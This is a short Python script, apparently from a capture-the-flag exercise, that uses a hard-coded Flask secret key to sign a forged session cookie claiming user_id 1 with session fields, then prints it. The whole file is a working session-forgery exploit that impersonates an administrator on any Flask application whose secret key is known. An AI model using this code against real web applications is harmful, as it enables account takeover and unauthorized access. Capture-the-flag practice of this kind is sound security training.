from itsdangerous import URLSafeTimedSerializer
from flask.sessions import SecureCookieSessionInterface

#ctf key Secret_key: a155eb4e1743baef085ff6ecfed943f2

sk ='a155eb4e1743baef085ff6ecfed943f2' 
adminobj = {
    "_fresh": True,
    "_id": "d1bddc33849d45244fbc59d801ac3b2f43c5f759c076624c7e72d83c16ad2820c8a88d0113cb35cab588260de9c3dea8f6bc2b9e4331621513ada1a83e630725",
    "csrf_token": "f8d6246298fc7a5e22be26607a0654d87a1bb9be",
    "user_id": "1"
}
class Baking_Cookie(SecureCookieSessionInterface):
    def get_signing_serializer(self,secret_key):
        signer_kwargs = {'key_derivation':self.key_derivation,'digest_method':self.digest_method}
        return URLSafeTimedSerializer(secret_key,salt=self.salt,serializer=self.serializer,signer_kwargs=signer_kwargs).dumps(adminobj)


cookie = Baking_Cookie()
print(cookie.get_signing_serializer(sk))


